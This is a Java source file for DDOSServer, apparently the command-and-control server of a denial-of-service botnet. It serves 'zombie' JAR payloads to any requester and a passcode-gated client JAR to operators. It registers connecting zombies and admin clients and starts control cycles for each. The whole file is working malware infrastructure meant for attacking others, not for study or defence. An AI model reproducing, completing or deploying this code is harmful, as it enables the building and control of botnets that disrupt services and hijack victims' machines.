package org.ddos.server;

import java.io.BufferedReader;
import java.io.EOFException;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.Serializable;
import java.net.SocketException;
import java.util.ArrayList;

import org.jnetwork.DataPackage;
import org.jnetwork.Server;
import org.jnetwork.SocketPackage;
import org.jnetwork.listener.ClientConnectionListener;
import org.jnetwork.listener.ClientDisconnectionListener;

public class DDOSServer implements ClientConnectionListener, ClientDisconnectionListener {
	private static final long serialVersionUID = -4786497469961089553L;
	private static final File JAR_CODE_FILE = new File(System.getProperty("user.dir") + "\\ClientJarCode.txt");
	private static final File ZOMBIE_JAR_FILE = new File(
			System.getProperty("user.dir") + "\\DeliminationCoreZombie.jar");
	private static final File CLIENT_JAR_FILE = new File(
			System.getProperty("user.dir") + "\\DeliminationCoreClient.jar");

	private static String CLIENT_JAR_CODE;

	static {
		try (BufferedReader reader = new BufferedReader(new FileReader(JAR_CODE_FILE))) {
			CLIENT_JAR_CODE = reader.readLine();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private Server server;
	public ArrayList<SocketPackage> readingClients = new ArrayList<>();

	public Server getServer() {
		return server;
	}

	public void setServer(Server server) {
		this.server = server;
	}

	@Override
	public void clientConnected(SocketPackage event) {
		try {
			DataPackage initialPackage = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
			if (initialPackage.hasMessage()) {
				System.out.println(event.getConnection().getRemoteSocketAddress() + " A computer has request a jar: "
						+ initialPackage.getMessage() + " (ID: " + initialPackage.getId() + ")");
				if (initialPackage.getMessage().equals("CLIENT_JAR_REQUEST")) {
					if (CLIENT_JAR_CODE.equals(initialPackage.getObjects()[0])) {
						event.getOutputStream().writeFile(CLIENT_JAR_FILE);
						System.out.println(event.getConnection().getRemoteSocketAddress() + " Sent client JAR file.");
					} else {
						event.getOutputStream().writeObject(new DataPackage().setMessage("INVALID_REQUEST"));
						System.out.println(event.getConnection().getRemoteSocketAddress()
								+ " Failed to send client JAR file due to an invalid passcode.");
					}
				} else if (initialPackage.getMessage().equals("ZOMBIE_JAR_REQUEST")) {
					event.getOutputStream().writeFile(ZOMBIE_JAR_FILE);
					System.out.println(event.getConnection().getRemoteSocketAddress() + " Sent zombie JAR file.");
				}
				Thread.sleep(3000);
				event.getConnection().close();
				return;
			}

			boolean isClient = !(boolean) initialPackage.getObjects()[0];
			println(event.getConnection().getRemoteSocketAddress() + " connected: " + (isClient ? "client" : "zombie"));
			if (isClient) {
				boolean success;
				if (!(success = CLIENT_JAR_CODE.equals(initialPackage.getObjects()[1]))) {
					System.out.println(event.getConnection().getRemoteSocketAddress()
							+ " Kicked for having an invalid admin password.");
				}
				event.getConnection().getOutputStream().writeObject(new Boolean(success));
			}

			server.setConnectionData(event, !isClient, null);

			if (isClient) {
				ClientCycle cycle = new ClientCycle();
				cycle.start(this, server, event);
			} else {
				ZombieCycle cycle = new ZombieCycle();
				cycle.start(this, server, event);
			}
		} catch (SocketException | EOFException e) {
			return;
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}
	}

	@Override
	public void clientDisconnected(SocketPackage event) {
		if (readingClients.contains(event)) {
			readingClients.remove(event);
		}
		try {
			println(event.getConnection().getRemoteSocketAddress() + " disconnected.");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private void println(Serializable o) throws IOException {
		System.out.println(o);

		for (SocketPackage client : readingClients) {
			client.getOutputStream().writeObject(new DataPackage(o).setMessage("CONSOLE_OUTPUT"));
		}
	}
}